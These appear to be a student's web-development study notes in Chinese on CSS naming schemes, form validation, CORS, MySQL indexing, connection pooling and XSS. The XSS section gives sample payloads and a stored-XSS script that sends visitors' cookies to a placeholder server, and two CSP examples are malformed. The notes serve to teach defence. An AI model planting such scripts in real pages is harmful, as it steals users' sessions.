# week8
## 主題研究與實作
### CSS 選擇器的命名⽅式
* OOCSS<br/>
  OOCSS(Object-Oriented CSS)的設計模式是鼓勵開發者設計出的CSS複用性能夠達到極致，最終目的是希望你可以藉由一套CSS來設計日後幾百幾千頁的頁面，而不用再去額外新增Class。其中最主要代表的框架就是Bootstrap。<br/>
  OOCSS 的設計裡面每一個 class 都是一個可以直接使用的 CSS 獨立個體。<br>
  其設計理念為二:
  * Separation of Structure from Skin：分離結構與樣式。結構像是元素的大小，樣式像是顏色等。
    ```css
    .btn {
      width: 20px;
      height: 100px;
      color: red;
      background-color: red;
    }
    ```
    可以改寫成
    ```css
    .btn-red {
      color: red;
      background-color: red;
    }
    .btn {
      width: 20px;
      height: 100px;
    }
    ```
    其中 OOCSS 中的結構與樣式的分離也有一個叫做 utilities 的觀念，也就是小工具，例如 padding、margin、border 及 width 等都可以作為一個小工具使用:
    ```css
    .pt-5 {
      padding-top: 5px;
    }
    
    .mt-5 {
      margin-top: 5px;
    }
    
    .border-all {
      border: 1px solid #000000;
    }
    
    .w-100 {
      width: 100%;
    }
    ```
  * Separation of Containers and Content：分離 HTML 與 CSS，意即盡量將可共用的樣式提取到單獨的 class 以供使用。
    ```css
    .header {
      color: yellow;
      width: 50px;
      height: 50px;
    }
    .content {
      color: red;
      width: 50x;
      height: 50px;
    }
    .footer {
      color: blue;
      width: 50px;
      height: 50px;
    }
    ```
    可以改寫成
    ```css
    .container {
      width: 50px;
      height: 50px;
    }
    
    .header {
      color: yellow;
    }
    .content {
      color: red;
    }
    .footer {
      color: blue;
    }
    ```
* SMACSS<br/>
  SMACSS(Scalable and Modular Architecture for CSS)指可擴展與模組化的設計模式。
  將結構分為五類:<br/>
  * Base: 所有網站的基礎架構，做全站設定為主，把最常用的東西全部先設定好。<br/>
    例如`margin: 0;`、`padding: 0;`、CSS Reset。
  * Layout: 主要用於共用的頁面，網站布局為主。<br/>
    主要的layout使用ID selectors，次要的layout使用class selectors。<br/>
    抽象語義化命名，抽象出共用樣式，通常 Layout 會有一個前綴詞 l-。<br/>
    例如:header、footer、nav。
    ```css
    #article {
      width: 80%;
      float: left;
    }
    #sidebar {
      width: 20%;
      float: right;
    }
    .l-fixed #article {
      width: 600px;
    }
    .l-fixed #sidebar {
      width: 200px;
    }
    ```
  * Module: 新增基底，再改換樣式(子模組)，很像前面OOCSS提到的「分離結構與樣式」。<br/>
    通常只用class來命名，不要使用ID selectors或tag，且要特別注意css的優先權。<br/>
    例如: `<button type="button" class="btn btn-red">red</button>`。
  * State: 用於新增狀態，通常與 Layout class 和 Module class 一起使用。<br/>
    例如:錯誤時添加個`.is-error`，成功時添加個`.is-success`的 class。
  * Theme: 主要用於設定網站主題的形式。<br/>
    例如:網頁的 dark mode。
* BEM<br/>
  BEM 是一種 CSS class 命名的設計模式，其由 Yandex 公司提出，將介面切割成許多獨立的區塊，以區塊（Block）、元素（Element）和修飾子（Modifier）來命名。<br/>
  優點是以元件觀念進行開發，具有重用性。它擁有 OOCSS 的架構清楚的美好，也沒有 SMACSS 複雜或令人混淆的部份。<br/>
  另外，由於 BEM 是功能導向的，因此不會像是 OOCSS 或 SMASS 可能會出現為了區別樣式而產生像是 .mt-15（翻譯：margin-top: 15px）這種讓人難以理解的 class 名稱。<br/>
  先看一個[官網](http://getbem.com/)的案例:
  ![](https://github.com/stephen533422/wehelp_first_stage/blob/main/week8/week8_task1_1-3.jpg)
  * 特色
    * Block name 描述他的功能、區塊的目的，而非狀態。
    * 不會添加樣式在裡面(例如：color, margin…等)。(因為要重複使用)
    * 使用BEM 的同時，不會使用 CSS 標籤選擇器和 ID 選擇器。
    * Block 命名方式：為單一單字`block`或使用1個破折號來連接過長的單字`block-name`。
    * Element 是 Block 中的组成成分。
    * Element 不能脫離 Block 單獨使用；但 Block 可以沒有 Element。
    * Element 命名方式:`block-name__element-name`。
    * Modifier name 定義了 Block 或 Element 的外觀，狀態或行為的實體。
    * 同一個 Block name 或 Element name 可以允許多組 Modifier name。
    * Modifier 命名方式：`block-name__element-name--modifier`。(原本的命名方式為1個底線 _，但因為閱讀性低而改良為現在的方式。)
    * 例外:並非所有的 CSS 命名方式都要如此，當某些 CSS 設定可重複使用時，就可以獨立出來，讓該設定被重複使用。
      ```css
      .clearfix{
          clear:both
      }
      .caps { 
          text-transform: uppercase; 
      } 
      ```
* Reference
  * https://hackmd.io/@YIHQx96xTI-K9vDjhzEfDA/S1TBmnon9
  * https://www.cythilya.tw/2018/06/05/css-methodologies/
  * https://ithelp.ithome.com.tw/articles/10236146
---
### 完善資料驗證程序
* front-end (html & JS)
  * `<input>`中
    * `required`: 必填欄位
    * `pattern="RegExp"`: RegExp為正規式，規定能輸入的字元格式，例如:<br/>
      `^[A-Z]\d{9}$`<br/>
      [A-Z] 代表由 A 至 Z 的所有可能英文字母，\d 代表由 0 至 9 的數目字(也可以寫成 [0-9]），{9} 則代表需要有九個數目字，^ 代表字串開始位置，$ 代表字串結束位置。
    * `minlength`
    * `maxlength`
  * JS利用addEventListener監聽input或submit事件，以及利用inputElement.validity來判斷、添加錯誤訊息
    * `inputElement.validity.valid`:符合所有<input>的要求。
    * `inputElement.validity.valueMissing`: if`required` but no value, return true.
    * `inputElement.validity.patternMismatch`: if value doesn't satisfy the pattern attribute, return true.
* back-end
* Reference:
  * https://pjchender.dev/webapis/webapis-form-validation/
  * http://www1.nttu.edu.tw/klou/course/921/js/09-regular.htm
  * https://www.html5pattern.com/
  * https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#suffering-from-a-type-mismatch
---
### AJAX 與 CORS
* CROS ( Cross-Origin Resource Sharing 跨來源資源共享 )
  * same-origin policy 同源政策

    >The same-origin policy is a critical security mechanism that restricts how a document or script 
    loaded by one origin can interact with a resource from another origin.
    
    同源政策是重要的安全性機制，其限制一個origin的document或script，與另一個origin資源的互動。

    >It helps isolate potentially malicious documents, reducing possible attack vectors. For example, it 
    prevents a malicious website on the Internet from running JS in a browser to read data from a third-
    party webmail service (which the user is signed into) or a company intranet (which is protected from 
    direct access by the attacker by not having a public IP address) and relaying that data to the attacker.
    
    同源政策幫助隔離那些潛在的惡意文件，避免可能的惡意攻擊。例如，可以避免惡意網站在瀏覽器取得第三方網路郵件伺服器的資料(使用者已經登入的)，或公司內部網路(攻擊者沒有公開IP地址而無法直接存取)而中繼資料給攻擊者。
  * same-origin 相同來源<br/>
      ![image](https://github.com/stephen533422/wehelp_first_stage/blob/main/week8/week8_task3_1.jpg)
      ( image credict: https://www.appsecmonkey.com/blog/same-origin-policy )<br/>
    MDN example:

    |URL 	|Outcome 	|Reason|
    |---|---|---|
    |http://store.company.com/dir2/other.html 	      |$\textcolor{green}{Same origin}$|Only the path differs|
    |http://store.company.com/dir/inner/another.html |$\textcolor{green}{Same origin}$|Only the path differs|
    |https://store.company.com/page.html 	           |$\textcolor{red}{Failure}$      |Different protocol|
    |http://store.company.com:81/dir/page.html 	     |$\textcolor{red}{Failure}$      |Different port (http:// is port 80 by default)|
    |http://news.company.com/dir/page.html 	         |$\textcolor{red}{Failure}$      |Different host|
  * 甚麼是CROS?
    >**Cross-Origin Resource Sharing (CORS) is an HTTP-header based mechanism that allows a server to indicate any origins (domain, scheme, or port) other than its own from which a browser should permit loading resources.** CORS also relies on a mechanism by which browsers make a "preflight" request to the server hosting the cross-origin resource, in order to check that the server will permit the actual request. In that preflight, the browser sends headers that indicate the HTTP method and headers that will be used in the actual request.
  * 我們可以在⾃⼰的網⾴中，使⽤ fetch() 或是 XMLHttpRequest 連結到https://www.google.com/ 並取得回應嗎？
    ```.js
    fetch("https://www.google.com" )
      .then((response) => response.json())
      .then((json) => { console.log(json);})
    ```
    ![image](https://github.com/stephen533422/wehelp_first_stage/blob/main/week8/week8_task3_2.jpg)
    會得到錯誤訊息( status: CORS error	)，仔細看會發現`No 'Access-Control-Allow-Origin' header is present on the request resource.`
  * 我們可以在⾃⼰的網⾴中，使⽤ fetch() 或是 XMLHttpRequest 連結到https://padax.github.io/taipei-day-trip-resources/taipei-attractions-assignment.json 並取得回應嗎？和上述的狀況，差別在哪裡？
    ```.js
    fetch("https://padax.github.io/taipei-day-trip-resources/taipei-attractions-assignment.json" )
      .then((response) => response.json())
      .then((json) => { console.log(json);})
    ```
    ![image](https://github.com/stephen533422/wehelp_first_stage/blob/main/week8/week8_task3_3.jpg)
    可以發現有取得回應，查看Response Headers會發現有`Access-Control-Allow-Origin: *`
  * 如何開放我們⾃⼰開發的 API，讓別的網站透過 fecth() 或是 XMLHttpRequest 連結，
達到如同第 3 點的可能性。<br/>
      fetch和XMLhttprequest都是會跟從同源政策<br/>
      如果我想發出跨來源請求的話，對方的伺服器必須在回應表頭(response header)裏加上`Access-Control-Allow-Origin`，並在`Access-Control-Allow-Origin`的設定裏，新增我的Origin(即是我的網址)，或者設定為萬用字符`*`，代表所有Origin都接受，這是在公共API裏常見的設定。
* Refrerence
  * https://ithelp.ithome.com.tw/articles/10253549
  * https://www.appsecmonkey.com/blog/same-origin-policy
---
### 使⽤主鍵、索引優化資料庫查詢效率
* Primary key 和 Index
  * Primary key(pk, 主鍵)
    * 是一種index，必須為unique，且不能為空值(NULL)，PK 會自動建立index。
    * 每個table 只能有一個primary key。
  * Index
    * 資料索引，可加快搜尋速度。
    * 可以複合多個欄位建立索引，但因遵守最左前綴，使用時須評估欄位的優先順序去建立索引。
* 新增index
  ```MySQL
  ALTER TABLE member ADD INDEX index_username(username);
  ```MySQL
* 查詢效率
  可以在前面加上`EXPLAIN`分析查詢效率。
  ```
  EXPLAIN SELECT * FROM member WHERE username="test" and password="test";
  ```
  其中type: 顯示的是查詢類型，是較為重要的一個指標值，依序從好到壞是：<br>
  system > const > eq_ref > ref > fulltext > ref_or_null > index_merge > unique_subquery > index_subquery > range > index > ALL <br/>
  ![image](https://miro.medium.com/v2/resize:fit:1218/format:webp/1*q-qXGwM2fgusZPYL2Q7HDw.jpeg)
* 為甚麼index的設置能有效地改善查詢效率?<br/>
  因為index使用B+Tree的資料結構建立，搜尋時可以使用Binary Search，理論上的T(n)=O(log(n))。
  ![image](https://ithelp.ithome.com.tw/upload/images/20200301/20124671D3sL4qgCgd.png)
* 範例:
  * 建立索引前:<br/>
    ![image](https://github.com/stephen533422/wehelp_first_stage/blob/main/week8/week8_task4_2-1.jpg)
  * 建立索引後:<br/>
    ![image](https://github.com/stephen533422/wehelp_first_stage/blob/main/week8/week8_task4_2-2.jpg)
* LIKE模糊查詢
  假設一個Table有多個欄位，其中`username`是index，其他非index，`id`為primary key。<br/>
  執行以下指令:
  ```MySQL
  EXPLAIN SELECT * from member where username like "test"; # 1
  EXPLAIN SELECT * from member where username like "test%"; # 2
  EXPLAIN SELECT * from member where username like "%test"; # 3
  EXPLAIN SELECT * from member where username like "%test%"; # 4
  ```
  ![image](https://github.com/stephen533422/wehelp_first_stage/blob/main/week8/week8_task4_5-1.jpg)
  使用EXPLAIN會發現，其中1與2的`type=range`，`key=index_name`，代表使用`index_name`進行搜尋；<br/>
  而3和4，`type=ALL`，代表搜尋對每一筆記錄進行完整掃描，沒有用上index。<br/>
  因為`index_username`的B+Tree是按照「index值」，也就是`username` character的順序進行排列的，例如:<br/>
  ![image](https://use-the-index-luke.com/static/fig02_05_like.en.WF4fN8id.png)
  <br/>因此當`"%test"`或`"%test%"`便無法使用`index_username`的順序進行搜尋。
  
  然而當搜尋的欄位只有`username`和`id`時:
  ```MySQL
  EXPLAIN SELECT id, username from member where username like "test"; # 1
  EXPLAIN SELECT id, username from member where username like "test%"; # 2
  EXPLAIN SELECT id, username from member where username like "%test"; # 3
  EXPLAIN SELECT id, username from member where username like "%test%"; # 4
  ```
  ![image](https://github.com/stephen533422/wehelp_first_stage/blob/main/week8/week8_task4_5-2.jpg)
  3和4就會使用index搜尋，且`type=index`。<br/>
  這是因為想要查詢的資料都在`index_username`的B+Tree，而輔助索引的B+ Tree的leaf node包含index value和primary key value，所以查`index_username`的B+Tree就能查到全部结果了，這就是所謂的覆蓋索引(covering index)。
  * 叢集索引（Clustered Index）
    * 當資料表設定了「叢集索引」，則資料表「實體資料列」的順序會依據叢集索引的值做排序
    * 叢集索引上的葉子結點(leaf node)就是放所有的資料，又稱資料頁。
    * 每一資料表只能有一個「叢集索引」
    * 通常Primary Key預設為「叢集索引」
  * 非叢集索引(Nonclustered Index, 又稱輔助索引secondary index)
    * 資料列未根據非叢集索引進行排序與儲存
    * 其葉子結點不包含每一筆資料的所有資料，只有建立該index的資料以及對應的叢集索引。
    * 通常透過輔助索引搜尋的順序如下:<br>
      透過輔助索引找到對應的葉子結點 -> 獲得對應叢集索引的 PK -> 透過叢集索引找到完整的資料
* Reference:
  * https://www.xiaolincoding.com/mysql/index/index_issue.html
  * https://use-the-index-luke.com/sql/where-clause/searching-for-ranges/like-performance-tuning
  * https://dotblogs.com.tw/EganBlog/2017/04/11/013049
  * https://ithelp.ithome.com.tw/articles/10230211
  * https://miggo.pixnet.net/blog/post/30862194
  * https://medium.com/@michael80402/mysql%E7%B4%A2%E5%BC%95-e002f707a5f4
---
### 使⽤ Connection Pool 連結資料庫
* Connection Pool<br/>
  Connection Pool中文為連線池，是位於DB前面的緩衝區。<br/>
  程式中我們常寫的connect()，包含了DB user帳密驗證，建立與資料庫的連線，接著我們會執行SQL，如execute()，最後會有close()來關閉連線。<br/>
  然而，對資料庫來說，connection的建立跟關閉，是很消耗資源的，一個簡單的查詢，這個SQL執行可能只需要0.1秒，但卻花了2秒在做建立連線跟關閉，假如有大量的建立連線跟關閉同時出現，不只對資料庫有很大的衝擊，也會拖垮系統效能。<br/>
  因此，就有connection pool的誕生了，可想像它是一個在資料庫前面的緩衝區或快取區，程式一執行就會建立好固定的連線數量，儲存在pool中，在程式需要連線的時候，getConnection()其實是到pool裡面去拿，不需要再花時間跟DB建立連線。<br/>
  關閉連線的時候，close()其實是把連線放回pool，以便於後續能重複使用。<br/>
  因此，connection pool的存在，可以降低對資料庫建立連線/關閉的次數，因為pool中的連線是可重複使用的，且每次的連線都是從pool中取得。<br/>
  此外，市面上的框架通常會提供很多設定功能，可以管理pool中的連線，如初始、最大連線數量，對閒置連線的處置等等，適當調整參數也能增進效能。
* 如何使⽤官⽅提供的 mysql-connector-python 套件，建立 Connection Pool。
  * To create a connection pool *implicitly*
    ```python
    dbconfig = {
      "database": "test",
      "user":     "joe"
    }
    
    cnx = mysql.connector.connect(pool_name = "mypool",
                                  pool_size = 3,
                                  **dbconfig)
    ```
    Subsequent calls to connect() that name the same connection pool return connections from the existing pool.
  * To create a connection pool *explicitly*
    ```python
    dbconfig = {
      "database": "test",
      "user":     "joe"
    }
    
    cnxpool = mysql.connector.pooling.MySQLConnectionPool(pool_name = "mypool",
                                                          pool_size = 3,
                                                          **dbconfig)
    cnxpool.add_connection(cnx = None)
    cnx1 = cnxpool.get_connection()
    cnx2 = cnxpool.get_connection()
    ```
* 實作:
  ```python
  import mysql.connector
  db_config={
  'host':'localhost',
  'database':'website',
  'user':'root',
  'password':'1234'
  }
  # 建立connection pool並取得一個連線
  connection_1 = mysql.connector.connect(
      pool_name="pool",
      pool_size=3,
      pool_reset_session=True,
      **db_config
  )
  # 執行指令
  def runSelect(connection_object):
      if connection_object.is_connected():
          cursor = connection_object.cursor()
          select_stmt="SELECT * from member;"
          cursor.execute(select_stmt)
          users = cursor.fetchall()
          for user in users:
              print(user)
          cursor.close()
  # 歸還connection object
  def endConnection(connection_object):
      if connection_object.is_connected():
          connection_object.close()
  
  # 取得第二個連線
  connection_2 = mysql.connector.connect(pool_name = "pool")
  # 取得第三個連線
  connection_3 = mysql.connector.connect(pool_name = "pool")
  # connection_4 = mysql.connector.connect(pool_name = "pool")
  print("connection 1")
  runSelect(connection_1)
  print("connection 2")
  runSelect(connection_2)
  print("connection 3")
  runSelect(connection_3)
  endConnection(connection_1)
  # print("connection 1")
  # runSelect(connection_1)
  # run已經歸還的connection object會錯誤
  connection_4 = mysql.connector.connect(pool_name = "pool")
  print("connection 4")
  runSelect(connection_4)
  ```
  ```python
  import mysql.connector
  db_config={
  'host':'localhost',
  'database':'website',
  'user':'root',
  'password':'1234'
  }
  # 建立connection pool
  connection_pool = mysql.connector.pooling.MySQLConnectionPool(
      pool_name="pool",
      pool_size=3,
      pool_reset_session=True,
      **db_config
  )
  # 取得connection object
  def getConnection():
    connection_object = connection_pool.get_connection()
    return connection_object
  # 執行指令
  def runSelect(connection_object):
      if connection_object.is_connected():
          cursor = connection_object.cursor()
          select_stmt="SELECT * from member;"
          cursor.execute(select_stmt)
          users = cursor.fetchall()
          for user in users:
              print(user)
          cursor.close()
  # 歸還connection object
  def endConnection(connection_object):
      if connection_object.is_connected():
          connection_object.close()
  connection_1=getConnection()
  connection_2=getConnection()
  connection_3=getConnection()
  # connection_4=getConnection()
  # [ mysql.connector.errors.PoolError: Failed getting connection; pool exhausted ] 超過最大連線數會錯誤
  print("connection 1")
  runSelect(connection_1)
  print("connection 2")
  runSelect(connection_2)
  print("connection 3")
  runSelect(connection_3)
  endConnection(connection_1)
  # print("connection 1")
  # runSelect(connection_1)
  # [ AttributeError: 'NoneType' object has no attribute 'is_connected' ] run已經歸還的connection object會錯誤
  connection_4=getConnection()
  print("connection 4")
  runSelect(connection_4)
  endConnection(connection_2)
  endConnection(connection_3)
  endConnection(connection_4)
  ```
* Reference:
  * https://vocus.cc/article/5f800406fd89780001365d17
  * http://peggg327.blogspot.com/2014/11/connection-pool.html
  * https://pynative.com/python-database-connection-pooling-with-mysql/
---
### 了解並預防 Cross-Site Scripting (XSS) 攻擊
* XSS<br/>
  當網頁在進行browser render的時候，使用者輸入的欄位或是沒有被驗證的參數就被嵌入在網頁的程式碼裡面，如果這段輸入包含惡意的指令就會導致使用者瀏覽這個頁面的時候觸發這段惡意程式，導致 XSS 風險的發生。<br/>
  這些惡意指令，通常是 JavaScript，但也可能是 Java、VBScript、ActiveX、Flash 或者甚至是普通的 HTML。<br/>
  而Hacker可以通過這些指令以使用者的身分獲取資料，例如:Cookie、使用者個資，或是將使用者導向釣魚網站。
  容易被攻擊的目標:電子郵件、討論區、搜尋引擎、留言板等等。
  ![](https://images.ctfassets.net/4un77bcsnjzw/6RC4KPYnw28idAirFK6C0u/ceba2c77262b57498b2c9a8bd8729576/XSS_Attack.svg)
  可分為三大種類:
  * 反射型 XSS （Reflected）
    * 又稱非持久型、參數型 XSS。
    * 最常見的 XSS 攻擊類型，通常是將惡意程式會藏在網址列裡，放在 GET 參數傳遞，例如：
      ```
      http://www.example.com/upload.asp?id=<script>alert(1);</script>
      ```
    * 這種手法要能夠成功攻擊，需要使用社交工程釣魚的技巧，如：E-mail，使 User 點擊 URL 攻擊才會生效。
    * 因為 URL 通常看起來很詭異，所以 Hacker 通常會使用短網址或 HTML Encoder 的方式嘗試欺騙 User。
    * 常出現於網站的搜尋欄、使用登入介面用來竊取 Cookie 或是釣魚欺騙。
  * DOM 型 XSS
    * 這種手法和反射型 XSS一樣，都需要使用社交工程釣魚的技巧，使 User 點擊 URL 攻擊才會生效。
    * Hacker 在 URL 輸入 DOM 註3 物件，把物件嵌入網頁程式碼，範例：
      ```
      <img src=# onerror=”alert(123)”>
      ```
  * 儲存型 XSS ( Stored )
    * 又稱儲存型，可能會影響 Web 伺服器。
    * 攻擊的方式是 Hacker 將惡意程式儲存在伺服器的資料庫中，只要使用者瀏覽到相關頁面就會執行惡意程式。
    * 最常見的例子就是將 Javascript 注入留言板，只要使用者瀏覽網頁時，網頁會載入留言板的 Javascript 進而使 User 受到攻擊，範例如下：
      ```
      我是壞人！ <script>alert(1);</script>
      ```
    * 然後當 User 瀏覽網頁的時候，就會因為網頁先載入了當下頁面的惡意程式，於是 User 的頁面就會跳出一個 1 的 alert，以此類推， Hacker 在這裡如果輸入讓 User 傳送 cookie 或是其他惡意程式行為，網頁也會完全照做！
* 實際設計⼀個 XSS 攻擊情境。
  * 儲存型XSS，例如，在留言板中留下以下內容，利用image，把瀏覽頁面的使用者的cookie，導向自己的server或線上工具，(參考本篇:https://ithelp.ithome.com.tw/articles/10238479)
  ```html
  <script>
  var i=new Image;
  i.src="<url>/?"+document.cookie;
  </script>
  ```
* 如何預防?
  * 驗證使用者的輸入<br/>
    * 做好欄位輸入的驗證與檢查，不論是前後端都應假設輸入是惡意且不可信任的，例如：URL、檔案上傳、表單欄位、留言板等。
    * 文法與語意：應確認每個網頁表單輸入欄位是否為合理的資料類型與內容，例如：年齡的欄位在文法上應只接受0–9的數字，而語意上應確認此數字介於 0–120。
    * 像上述所說明的任何輸入和其他難以定義文法的自由格式，都應該要經過編碼成為純字符串來處理，防止內容被當作程式碼執行，許多程式框架都有提供內建的編碼函式庫，可以依自己的慣用語言程式查找並多加利用。
    * 絕對不要將使用者的輸入放入 註解、屬性名稱、標籤名稱 等，因為這些位置都能將字符串作為程式碼運行。
  * CSP<br/>
    設定內容安全策略（CSP）的標頭，明確定義允許瀏覽器在該頁面上加載的內容來源，涵蓋的類型包括 JavaScriptCSS、HTML框架、字體、圖片和可嵌入對象，例如 Java applet、ActiveX等。<br/>
    若沒設定到時會自動採用`default-src`的設定值。
    ```html
    <!-- 不允許所有內容 -->
    <meta http-equiv="Content-Security-Policy" content="default-src 'none';">
    <!-- 允許來自相同的網域的所有內容 -->
    <meta http-equiv="Content-Security-Policy" content="default-src 'self';">
    <!-- 允許來自相同的網域和某網域(example.com)的所有內容 -->
    <meta http-equiv="Content-Security-Policy" default-src 'self' example.com *.example.com;">
    <!-- 允許所有來源的圖片、允許信任來源(example.org, example.net)的媒體(音訊、影片)、允許信任來源(userscripts.example.com)的腳本，其他未設定的允許來自相同的網域的內容 -->
    <meta http-equiv="Content-Security-Policy" default-src 'self'; img-src *; media-src example.org example.net; script-src userscripts.example.com;">
    <!-- 範例: online banking site，允許來自信任的網域透過HTTPS傳送的所有內容 -->
    <meta http-equiv="Content-Security-Policy" content="default-src https://onlinebanking.example.com;">
    <!-- 範例: web mail site，允許來自相同的網域和某網域的所有內容、允許所有來源的圖片 -->
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' *.example.com; img-src *;">
    ```
  * 保護 Cookie<br/>
    在Header中 `Set-Cookie`加上 `; HttpOnly`。<br/>
    對 Cookie 設定 `HttpOnly` 的屬性，代表拒絕與 JavaScript 共享 Cookie ，確保程式碼沒有存取權
  * 2FA（Two-factor authentication）<br/>
    比較重要的操作設置第二道關卡，例如需要透過手機接收驗證碼、需要再次輸入密碼等等。
* Reference:
  * https://hitcon.org/2015/CMT/download/day1-a-r4.pdf
  * https://tech-blog.cymetrics.io/posts/jo/zerobased-cross-site-scripting/
  * https://ithelp.ithome.com.tw/articles/10185408
  * http://www.powenko.com/wordpress/xss%E6%94%BB%E6%93%8A/
  * https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
  * https://hackmd.io/@Eotones/BkOX6u5kX
  * https://blog.huli.tw/2021/06/19/xss-attack-and-defense/
  * https://ithelp.ithome.com.tw/articles/10238479
